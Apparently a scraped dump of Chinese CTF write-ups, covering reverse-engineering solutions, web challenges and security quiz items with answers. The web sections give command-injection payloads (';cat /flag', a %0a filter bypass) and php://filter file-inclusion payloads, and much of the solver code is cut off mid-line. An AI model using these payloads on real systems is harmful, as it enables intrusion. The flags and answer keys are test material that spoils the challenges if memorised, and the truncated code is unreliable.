Hex形式粘贴到winhex中（后面的字符串不用复制，是程序本身输出）： 看过run.pyc文件的16进制就会发现，该文件与他非常相似，知识少了一个文件头， 我们补全后并把他命名为pyc文件，然后再用uncompyle6反编译得到一个py文件，查看源代码： # uncompyle6 version 3.9.0 # Python bytecode version base 3.8.0 (3413) # Decompiled from: Python 3.8.0 (tags/v3.8.0:fa919fd, Oct 14 2019, 19:37:50) [MSC v.1916 64 bit (AMD64)] # Embedded file name: sample.py footprint = '3qzqns4hj6\\neeaxc!4a-%\\nd735_@4l6g\\nf1gd1v7hdm\\n1+$-953}81\\na^21vbnm3!\\n-#*f-e1d8_\\n2ty9uipok-\\n6r1802f7d1\\n9wez1c-f{0' xx0000 = [] footprintlist = footprint.split('\\n') for i in range(len(footprintlist)): # 将footprint数组以‘\\n’分割放入xx0000中 xx0000.append(list(footprintlist[i])) else: def xxxx000x0(num): # 将输入的num转换成10位的二进制数 xx000000 = format(num, '010b') return xx000000 oxooxxxxxoooo = [] xx0000000 = input(\"Please enter the previous 10 digits again and ending with '\\\\n': \").split(' ') # 让我们再次输入10个数 if len(xx0000000) == 10: # 将输入的数的数量做比较，只要等于10就通过 try: for i in xx0000000: oxooxxxxxoooo.append(int(i)) except: print('err input!') exit(-1) else: print('err input!') exit(-1) for i in range(len(oxooxxxxxoooo)): # 看到这里我们可以发现10个数并不是随便输入，应该也是run.py程序需要的那10个数 oxooxxxxxoooo[i] = list(xxxx000x0(oxooxxxxxoooo[i])) # 看到这里，结合上面函数的功能可以发现迷宫是一个10*10的阵列，并且就是我们输入的10个数生成的。放在oxooxxxxxoooo中 else: xx0000x000 = oxooxxxxxoooo # 将迷宫存储在xx0000x000中，定义起始位置坐标是（0，0） x, o = (0, 0) xx00x00x0xxx00 = [(x, o)] xx00x00x0xxx00input = list(input('input maze path:')) count = 0 while (x, o) != (9, 9): # 用xx00x00x0xxx00数组存储用户每次按键后在迷宫中的位置坐标 if count 0 and xx0000x000[x][o - 1] == '0': o -= 1 count += 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) elif xx0000x0xxx00 == 'd': if o 0 and xx0000x000[x - 1][o] == '0': count += 1 x -= 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) else: if xx0000x0xxx00 == 's': if x 可以看到这是一个迷宫游戏，找到迷宫存储位置，直接编辑代码输出迷宫： oxooxxxxxoooo = [] xx0000000 = input(\"Please enter the previous 10 digits again and ending with '\\\\n': \").split(' ') if len(xx0000000) == 10: try: for i in xx0000000: oxooxxxxxoooo.append(int(i)) except: print('err input!') exit(-1) else: print('err input!') exit(-1) for i in range(len(oxooxxxxxoooo)): oxooxxxxxoooo[i] = list(xxxx000x0(oxooxxxxxoooo[i])) else: xx0000x000 = oxooxxxxxoooo for i in oxooxxxxxoooo: # 添加for循环输出迷宫 print(i) x, o = (0, 0) xx00x00x0xxx00 = [(x, o)] xx00x00x0xxx00input = list(input('input maze path:')) count = 0 运行文件得到迷宫答案：sddsdssdddwwwddsssssaaaaassddsddwdds 运行文件输入迷宫答案： 得知flag就是迷宫路径答案经过的footprint字符串的字符 为了方便，直接编辑tiqu.py # uncompyle6 version 3.9.0 # Python bytecode version base 3.8.0 (3413) # Decompiled from: Python 3.8.0 (tags/v3.8.0:fa919fd, Oct 14 2019, 19:37:50) [MSC v.1916 64 bit (AMD64)] # Embedded file name: sample.py footprint = '3qzqns4hj6\\neeaxc!4a-%\\nd735_@4l6g\\nf1gd1v7hdm\\n1+$-953}81\\na^21vbnm3!\\n-#*f-e1d8_\\n2ty9uipok-\\n6r1802f7d1\\n9wez1c-f{0' xx0000 = [] footprintlist = footprint.split('\\n') for i in range(len(footprintlist)): xx0000.append(list(footprintlist[i])) else: def xxxx000x0(num): xx000000 = format(num, '010b') return xx000000 oxooxxxxxoooo = [] # 这里 # xx0000000 = input(\"Please enter the previous 10 digits again and ending with '\\\\n': \").split(' ') xx0000000 = '511 112 821 949 517 637 897 575 648 738'.split(' ') if len(xx0000000) == 10: try: for i in xx0000000: oxooxxxxxoooo.append(int(i)) except: print('err input!') exit(-1) else: print('err input!') exit(-1) for i in range(len(oxooxxxxxoooo)): oxooxxxxxoooo[i] = list(xxxx000x0(oxooxxxxxoooo[i])) else: xx0000x000 = oxooxxxxxoooo for i in oxooxxxxxoooo: print(i) x, o = (0, 0) xx00x00x0xxx00 = [(x, o)] # 这里 # xx00x00x0xxx00input = list(input('input maze path:')) xx00x00x0xxx00input = list('sddsdssdddwwwddsssssaaaaassddsddwdds') count = 0 while (x, o) != (9, 9): if count 0 and xx0000x000[x][o - 1] == '0': o -= 1 count += 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) elif xx0000x0xxx00 == 'd': if o 0 and xx0000x000[x - 1][o] == '0': count += 1 x -= 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) else: if xx0000x0xxx00 == 's': if x 运行得到flag{3eea35d-953744a-6d838dle-f9802c-f7d10} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/RC4.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/RC4.html","title":"RC 4","keywords":"","body":"Reverse--RC4 题目描述 小蓝同学发给你一个exe后缀的可执行文件， 你运行后它只输出了一句 话。你意识到这可能不是那么简单，因为更多的信息被隐藏在程序内 部。为了找到隐藏的flag,你需要使用逆向分析技术来深入探究程序的 内部。附件下载提取码(GAME)备用下载 解题 可以看到肯定与RC4加密有关 老样子先扔到exeinfope中查看：无壳的32位程序 放入32位IDA中进行查看，找到main函数可以看到程序开始给了我们一个字符串str=“The quick brown fox jumps over a lazy dog.”和一个数组v5，结尾只有一个sub_401005函数，我们对该函数进行跟踪，看到最终执行的加密代码： ​ 可以看出非常典型的RC4加密代码（先进行初始化，再进行加密）可以学习学习RC4原理和代码实现， 更据此可以写出最终结题exp：（数组v5即使待加密的数据，str即是密钥key） 运行代码得到最终flag{c8fd99f1-841a-44c9-8d38-746db6ff95c1} #include void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k) //鍒濆鍖栧嚱鏁? { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Smali.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/Smali.html","title":"Smali","keywords":"","body":"题目描述 都说学好Smali是学习Android逆向的基础，现在刚好有一个smali文件，大家一起分析一下吧~~ 解题 下载附件，如题所述是一个smali文件，搜索得知这是一种语言，因为题目说与android有关， 进而搜索两者关系，得知有工具可以将smali语言编译为java语言 Smali2Java.zip_免费高速下载|百度网盘-分享无限制 (baidu.com) 点击处理文件，得到java代码： /** * Generated by smali2java 1.0.0.558 * Copyright (C) 2013 Hensence.com */ package net.bluelotus.tomorrow.easyandroid; import android.util.Base64; import java.io.PrintStream; import java.security.NoSuchAlgorithmException; import javax.crypto.NoSuchPaddingException; import java.security.InvalidKeyException; import javax.crypto.IllegalBlockSizeException; import javax.crypto.BadPaddingException; import javax.crypto.spec.SecretKeySpec; import javax.crypto.Cipher; import java.security.Key; import java.security.GeneralSecurityException; public class Crackme { private String str2 = \"cGhyYWNrICBjdGYgMjAxNg==\"; public Crackme() { GetFlag(\"sSNnx1UKbYrA1+MOrdtDTA==\"); } private String GetFlag(String p1) { byte[] \"content\" = Base64.decode(p1.getBytes(), 0x0); String \"kk\" = new String(Base64.decode(str2.getBytes(), 0x0)); System.out.println(decrypt(\"content\", \"kk\")); return null; } private String decrypt(byte[] p1, String p2) { String \"m\" = 0x0; try { byte[] \"keyStr\" = p2.getBytes(); SecretKeySpec \"key\" = new SecretKeySpec(\"keyStr\", \"AES\"); Cipher \"cipher\" = Cipher.getInstance(\"AES/ECB/NoPadding\"); \"cipher\".init(0x2, \"key\"); byte[] \"result\" = \"cipher\".doFinal(p1); return \"m\"; } catch(NoSuchPaddingException \"e\") { \"e\".printStackTrace(); } return \"m\"; } } 可以看到代码将两个base64字符串分别进行解码作为decrypt函数的参数： 将两个字符串解码后得知 cGhyYWNrICBjdGYgMjAxNg==解码后为phrack ctf 2016； sSNnx1UKbYrA1+MOrdtDTA==解码后为乱码 在根据decrypt函数使用的是AES加密，不难得到两个一个是作为密钥，一个作为密文。 用CyberChef解密得到flag：PCTF{Sm4liRiver} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/sum.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/sum.html","title":"Sum","keywords":"","body":"题目描述 数字游戏 解题 拖入exeinfope，查看文件属性，无壳64位elf程序，拖入64位IDA分析代码 int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rbp int v4; // r14d unsigned int v5; // r12d __int64 i; // rbx char v7; // al int v8; // eax const char *v9; // rax v3 = (char *)&matrix; v4 = 1; v5 = 0; puts(\"Welcome to Solver!\"); do { for ( i = 0LL; i != 9; ++i ) { if ( !v3[i] ) { v7 = getchar(); if ( (unsigned __int8)(v7 - 49) > 8u ) //减49是因为v7是字符类型，需转换为数字计算 v4 = 0; else v3[i] = v7 - 48; } v8 = v3[i]; v5 += v8; } v3 += 9; } while ( v3 != (char *)&matrix + 81 ); if ( v4 && (unsigned int)verify(\"Welcome to Solver!\", argv) ) //调用verify函数判断正确性 { puts(\"You Win!\"); __snprintf_chk(buf, 32LL, 1LL, 32LL, \"%d\", v5); v9 = (const char *)str2md5(buf, strlen(buf)); __printf_chk(1LL, \"flag is: flag{%s}\\n\\n\", v9); exit(0); } puts(\"Again~\"); return 0; } 分析程序，可以看出我们的flag并不是我们自己输入的，而是通过一个for循环让我们输入一个字符串，正确之后程序会给我们flag，所以不难猜测v7就是这个游戏的正确答案，进入verify函数： 咳咳，发现看不懂别慌，可以看到两个函数有一个都用过的变量matrix，点击可以看到一个长度为9的数组，在后面还有一个unk_202069变量在verrify函数中使用过： 再根据main函数的for循环，好像该程序是9位9位的进行验证，将这两个数组变量导出，整理一下，发现刚好是9*9的矩阵，在根据题目数字游戏和数组中的若干0，猜测可能是数独，数组中的0就只我们要填的正确答案，验证： int sum[] = { 5, 3, 0, 0, 7, 0, 0, 0, 0, 6, 0, 0, 1, 9, 5, 0, 0, 0, 0, 9, 8, 0, 0, 0, 0, 6, 0, 8, 0, 0, 0, 6, 0, 0, 0, 3, 4, 0, 0, 8, 0, 3, 0, 0, 1, 7, 0, 0, 0, 2, 0, 0, 0, 6, 0, 6, 0, 0, 0, 0, 2, 8, 0, 0, 0, 0, 4, 1, 9, 0, 0, 5, 0, 0, 0, 0, 8, 0, 0, 7, 9 }; 将该游戏发给GPT，让他给我们正确答案： int sum_jie[] = { 5, 3, 4, 6, 7, 8, 9, 1, 2, 6, 7, 2, 1, 9, 5, 3, 4, 8, 1, 9, 8, 3, 4, 2, 5, 6, 7, 8, 5, 9, 7, 6, 1, 4, 2, 3, 4, 2, 6, 8, 5, 3, 7, 9, 1, 7, 1, 3, 9, 2, 4, 8, 5, 6, 9, 6, 1, 5, 3, 7, 2, 8, 4, 2, 8, 7, 4, 1, 9, 6, 3, 5, 3, 4, 5, 2, 8, 6, 1, 7, 9 }; 在写解题程序，输出我们想要的答案： #include #include #include int main(){ int sum[] = { 5, 3, 0, 0, 7, 0, 0, 0, 0, 6, 0, 0, 1, 9, 5, 0, 0, 0, 0, 9, 8, 0, 0, 0, 0, 6, 0, 8, 0, 0, 0, 6, 0, 0, 0, 3, 4, 0, 0, 8, 0, 3, 0, 0, 1, 7, 0, 0, 0, 2, 0, 0, 0, 6, 0, 6, 0, 0, 0, 0, 2, 8, 0, 0, 0, 0, 4, 1, 9, 0, 0, 5, 0, 0, 0, 0, 8, 0, 0, 7, 9 }; int sum_jie[] = { 5, 3, 4, 6, 7, 8, 9, 1, 2, 6, 7, 2, 1, 9, 5, 3, 4, 8, 1, 9, 8, 3, 4, 2, 5, 6, 7, 8, 5, 9, 7, 6, 1, 4, 2, 3, 4, 2, 6, 8, 5, 3, 7, 9, 1, 7, 1, 3, 9, 2, 4, 8, 5, 6, 9, 6, 1, 5, 3, 7, 2, 8, 4, 2, 8, 7, 4, 1, 9, 6, 3, 5, 3, 4, 5, 2, 8, 6, 1, 7, 9 }; for (int i = 0; i 可以看到这个for循环的格式与IDA编译出的main函数非常相似，最终得到游戏正确答案：468912723481342575971422657913948591537428763345261 运行程序（linux系统运行）输入字符串，得到flag{bbcbff5c1f1ded46c25d28119a85c6c2} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/XOR.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/XOR.html","title":"XOR","keywords":"","body":"题目描述 小蓝同学给你发来了一个Linux下可运行的elf文件，它实现了一个简单 的异或加密算法。它会把用户输入的字符串和一个固定的密钥做异或操 作，然后把结果和一个预设的值进行比较。如果匹配，用户所输入的就 是flag值。附件下载提取码(GAME) 备用下载 解题 异或，无壳，用IDA打开，找到main函数，按F5转伪C代码 ​ 可以看到是一个最简单的异或程序，根据代码，程序最终异或出来的就是s2数组，将s2数组复制出来，简单整理一下，得到一个c数组，写出解题代码： #include #include #include int main(){ char str[] = \"SEcRET7\"; char s2[42] = { 0x60, 0x0F, 0x35, 0x3E, 0x35, 0x02, 0x29, 0x35, 0x77, 0x61, 0x1A, 0x65, 0x26, 0x64, 0x06, 0x20, 0x4E, 0x20, 0x60, 0x53, 0x60, 0x68, 0x64, 0x5A, 0x64, 0x51, 0x71, 0x7E, 0x54, 0x67, 0x21, 0x6B, 0x21, 0x65, 0x05, 0x73, 0x64, 0x51, 0x60, 0x75, 0x4A, 0x61 }; for(int i = 0; i 很显然最终答案并不是我们想要的flag， 继续分析。直接看汇编，发现s字符串再汇编代码中的存储并不是平常的样子（数组和字符串在寄存器中的存储方式为由低位到高位）， 而是将每个字符反过来放置在内存中，所以我们最终处理的s2数组应该也是要反过来的，最终得到正确代码：得到flag{a83ee6c1-2296-4d3e-9d3c-42604f76f7d5} #include #include #include int main(){ char str[] = \"SEcRET7\"; // 37544552634553h(在IDA中识别到的) //int str[] = {0x53, 0x45, 0x63, 0x52, 0x45, 0x54, 0x37}; // 实际上的\"SEcRET7\" // 数组和字符串在寄存器中的存储方式为由低位到高位 int s2[] = { 0x35, 0x29, 0x02, 0x35, 0x3E, 0x35, 0x0F, 0x60, // s2[0] = 0x600F353E35022935 0x20, 0x06, 0x64, 0x26, 0x65, 0x1A, 0x61, 0x77, // s2[1] = 0x77611A6526640620 0x5A, 0x64, 0x68, 0x60, 0x53, 0x60, 0x20, 0x4E, // s2[2] = 0x4E2060536068645A 0x6B, 0x21, 0x67, 0x54, 0x7E, 0x71, 0x51, 0x64, // s2[3] = 0x6451717E5467216B 0x75, 0x60, 0x51, 0x64, 0x73, 0x05, 0x65, 0x21, // s2[4] = 0x2165057364516075 0x61, 0x4A // s2[5] = 0x4A61 }; for(int i = 0; i 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/填数游戏.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/填数游戏.html","title":"填数游戏","keywords":"","body":"题目描述 答案加flag{} 解题 下载附件，一个exe程序，放入exeinfope： 32位程序，放入IDA32，找到主程序： 纯C++写法，执行流程很明确，打开check函数： 可以看到游戏校验时是9*9的矩阵，想到是数独： 打开datastart数组是初始数独矩阵： 提取出来，得到数独： int sum[] = { 0, 0, 7, 5, 0, 0, 0, 6, 0, 0, 2, 0, 0, 1, 0, 0, 0, 7, 9, 0, 0, 0, 3, 0, 4, 0, 0, 2, 0, 1, 0, 0, 0, 0, 0, 0, 0, 3, 0, 1, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 7, 1, 0, 4, 0, 0, 0, 0, 8, 2, 0, 0, 0, 0, 5, 9, 0, 0, 0, 8, 0, 0, 8, 0, 0, 0, 1, 0, 0, 3 } 注意程序中的数组是4位一组，只有一位有效，以下是提取脚本： #include using namespace std; int main() { int map[] = {0, 0, 0, 0, 0, 0, 0, 0, 7, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0, 0, 0, 9, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5, 0, 0, 0, 9, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; for (int i = 0; i 拿到在线解题数独网站得到正确数独： 在线数独求解器 (gwalker.cn) 得到正确数独，编写脚本输出正确答案： #include using namespace std; int main() { int sum[81] = { 0, 0, 7, 5, 0, 0, 0, 6, 0, 0, 2, 0, 0, 1, 0, 0, 0, 7, 9, 0, 0, 0, 3, 0, 4, 0, 0, 2, 0, 1, 0, 0, 0, 0, 0, 0, 0, 3, 0, 1, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 7, 1, 0, 4, 0, 0, 0, 0, 8, 2, 0, 0, 0, 0, 5, 9, 0, 0, 0, 8, 0, 0, 8, 0, 0, 0, 1, 0, 0, 3 }; int sum_right[81] = { 3, 4, 7, 5, 8, 9, 1, 6, 2, 5, 2, 8, 4, 1, 6, 9, 3, 7, 9, 1, 6, 2, 3, 7, 4, 5, 8, 2, 6, 1, 8, 7, 5, 3, 4, 9, 7, 3, 9, 1, 6, 4, 8, 2, 5, 8, 5, 4, 3, 9, 2, 7, 1, 6, 4, 9, 3, 6, 5, 8, 2, 7, 1, 1, 7, 5, 9, 2, 3, 6, 8, 4, 6, 8, 2, 7, 4, 1, 5, 9, 3 }; cout 得到答案，但是校验flag却发现错误，再次检查代码，并没有发现加密输入字符串代码，猜测flag不止输出正确答案， 题目中原本的数字也要输出，但经过尝试发现也是错误 再次尝试将数独题目中的数字用0输出，得到正确答案，脚本如下： cout 得到flag{340089102508406930016207058060875349709064820854392006093650071170023604602740590} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Reverse/珍贵资料.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Reverse/珍贵资料.html","title":"珍贵资料","keywords":"","body":"题目描述 你无意间得到了一些珍贵资料，可惜他们看起来不知道是什么，据说解开它可以得到flag神器。 tips：flag是flag{结果} 附件描述： 文件名：珍贵资料.zip 校验（SHA1）：4EF84DF5B34C12DED8EC3F603CFBC065251864B4 解题 下载附件，有两个文件unknown和unknown2， 通过查看文件头和经验可知： 看似是一个pk文件，但是该文件是一个apk包。 修改unknown2后缀为apk，使用模拟器打开： 用jadx-gui打开，找到主要登录代码： 可以看到程序是将 用户输入的账号与USER_NAME匹配 用户输入的password加密后的字符串与PASSWORD 加密代码： /* JADX INFO: Access modifiers changed from: private */ public String encode(String string) { String s = Encryption(string); return s != null ? s : \"\"; } public static String Encryption(String s) { StringBuilder sb = new StringBuilder(); if (s == null || s.length() 根据这个可以很轻易写出解题脚本，但是我们并不知道程序中的PASSWORD是什么，猜测在文件unknown中。 经过百度得知ANDROID BACKUP文件可以被提取，使用abe工具（项目地址：https://github.com/nelenkov/android-backup-extractor） 使用方法如下： 注意：需要安装Java环境 java -jar .\\abe.jar unpack [被提取文件路径] [提取出的文件路径] 提取出来后，使用010的文本模式可以看到用户名和密码： 知道字符串后，写出解题脚本： #include using namespace std; int main() { char source[] = \"ijklmstuvwxyz0123abcdenopqrfgh456789\"; char password[] = \"dudqlvqrero1\"; char flag[] = \"\"; int len = 12; int LEN = 36; for (int j = 0; j 得到flag{amanisnobody1} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Web/web01-1.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Web/web01-1.html","title":"Web 01 1","keywords":"","body":"题目描述 try your best to find the flag. 解题 创建题目： 查看源代码，得到信息：source.txt 访问得到代码： 得知大概运行流程：通过post数据传入一个数组，然后经过extract函数将数组的 内容变成变量。如果传入的数据正好覆盖了 $bug 和 $secret 原有的值，并使他们相等就 可以获取flag. 使用BP构造流量包，使bug==sercert 右键改变http包类型为post 发送到重发器 添加字段： 点击Send： 得到flag{a5c69aa8-a98a-40ed-8079-0d4c3a16bcc4} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Web/web01-2.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Web/web01-2.html","title":"Web 01 2","keywords":"","body":"题目描述 try your best to find the flag 解题 打开容器，并查看源代码 搜索得知是.bak信息泄露，访问index.php.bak: 查看源代码： '; ?> 审计代码，发现index.php接收file参数，可以通过file参数进行文件包含。 文件包含中权限最小，也是最常用的就是php://filter协议，本题include会自动拼接“.php”后缀，仔细思索后构造payload:?file=php://filter/read=convert.base64-encode/resource=flag(猜测flag位于当前目录下) 得到base64编码：PD9waHANCiRmbGFnPSdmbGFnezc0Y2NlMTVkLTczN2YtNGJhMS1iYjc0LWZkN2UwZDQ3Nzg1M30nOw0KPz4= 解码后得到：flag{74cce15d-737f-4ba1-bb74-fd7e0d477853} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Web/web02.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Web/web02.html","title":"Web 02","keywords":"","body":"题目描述 try your best to find the flag 解题 打开容器，得到代码： {$cmd}\"; } show_source(__FILE__); ?> 命令执行漏洞 通过传入ip参数进行命令执行，而echo \"{$cmd}\"；将结果进行回显 。 构造payload，CTF中有关文件的一般在/flag下： ?ip=;cat /flag 得到flag{6d9a987f-1c3c-4315-847d-9982db4f807c} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Web/web03-1.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Web/web03-1.html","title":"Web 03 1","keywords":"","body":"题目描述 try your best to find the flag 解题 打开靶场，得到源代码： '', ';' => '', '|' => '', '-' => '', '$' => '', '(' => '', ')' => '', '`' => '', '||' => '', ); $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); $cmd = shell_exec( 'ping -c 4 ' . $target ); echo $target; echo \"{$cmd}\"; } show_source(__FILE__); 可以看到也是命令执行漏洞，但是程序过滤了很多字符 可以看到没用 考虑用%0a换行绕过， 得到flag{fb8812ca-a5dc-4000-9a29-658714f3b889} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Web/文件包含绕过.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Web/文件包含绕过.html","title":"文件包含绕过","keywords":"","body":"题目描述 try your best to find the flag 解题 打开靶场得到代码： 文件包含 尝试使用php://filter协议进行文件读取； payload：filename=php://filter/read=convert.base64-encode/resource=index.php 发现被check.php给拦截了。去掉中间的读取方式发现没有触发拦截 根据题意，尝试使用不同的方式进行读取，即更换读取方式。 最终得到payload：?filename=php://filter/convert.iconv.utf-8*.utf-16*/resource=flag.php 获取到flag{c413b6ca-e3b1-4c18-977b-2911166377f6} check.php源代码： ?filename=php://filter/convert.iconv.utf-8*.utf-16*/resource=check.php 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/单选题.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/单选题.html","title":"单选题","keywords":"","body":" 安卓逆向中，反编译JAVA通常使用以下哪个软件？（ C ） A、dnSpy B、JPEXS C、JEB D、IDA 下列工具中，用来进行流量分析的工具是（ D ） A、Ultra Edit B、010 editor C、winhex D、wireshark 在volatility中，可以使用哪个命令来枚举系统中的进程？（ C ） A、handles B、filescan C、pslist D、modscan 在stegsolve中，使用image combiner功能时，不支持以下哪种运算？（ B ） A、xor B、mul C、or D、and RAR默认采用的加密算法是（ A ） A、AES B、DES C、3-DES D、TEA 可以通过查看下列哪个寄存器获取相对于栈基地址的的索引？（ B ） A、ESP B、EBP C、ESI D、EDI 通过劫持栈指针指向攻击者所能控制的内存再在相应的位置进行 ROP的操作通常称为（ B ） A、frame faking B、stack pivoting C、ret2libc D、ret2_dl_runtime_resolve 释放两次内存, 可与Unlink搭配实现任意地址读写的操作通常称为（ A ） A、double free B、ROP C、fastbin attack D、Off-By-One 对 inuse 的 fastbin 进行 extend时，如在64位系统下的偏移为8字节，那么在32位系统下，应改为（ C ） A、32字节 B、16字节 C、4字节 D、8字节 当程序向缓冲区中执行写入操作时，如果写入的字节数只越界了一个字节，那么这种漏洞通常称为（ A ） A、off-by-one B、house of einherjar C、double free D、chunk extend 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/多选题.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/多选题.html","title":"多选题","keywords":"","body":" 以下哪些工具能抓取数据包？（ ABCD ） A、fiddler B、wireshark C、burpsuite D、tcpdump 以下哪些属于文件系统？（ ACD ） A、FAT B、ftp C、NTFS D、ext4 以下哪些命令可以在Linux下查找文件？（ AD ） A、grep B、tail C、touch D、locate 以下哪些方式可以修改linux文件内容？（ ACD ） A、>> B、less C、> D、sed 以下哪些是属于web漏洞？（ ABCD ） A、XSS B、SQL injection C、SSRF D、RCE 以下哪些后缀可以被apache解析为php?（ AD ） A、php3 B、html C、phar D、phtml 以下哪些选项是数据库？（ BCD ） A、dbms B、mongo C、mysql D、redis 以下哪些属于非对称加密算法？（ BC ） A、DES B、RSA C、ECC D、RTS 以下哪些属于单表替代密码？（ AC ） A、移位密码 B、维吉尼亚密码 C、仿射密码 D、希尔密码 Windows平台逆向中，一般不会涉及以下哪个文件的分析？（ CD ） A、DLL B、EXE C、DEX D、ELF 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/赣育杯/Areyubot.html":{"url":"3.网络安全/CTF竞赛/赣育杯/Areyubot.html","title":"Areyubot","keywords":"","body":"解题思路 手速题，使用nc连接后按照要求答题， 一共三道题，答完后给出flag 最后给出flag：SangFor{5qgjJc4rPLbNvyN_xB3NPuwUCg94hRMt} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/赣育杯/勒索病毒.html":{"url":"3.网络安全/CTF竞赛/赣育杯/勒索病毒.html","title":"勒索病毒","keywords":"","body":"解题思路 下载附件，得到四个文件 使用winhex分别打开每个文件，得到flag：Sangfor{dd704749-cf76-4f05-87e6-4a26c63e6517} 混淆思路 使用exeinfo查看文件信息： 得知程序为64位且未加壳，使用64位IDA打开 找到main函数 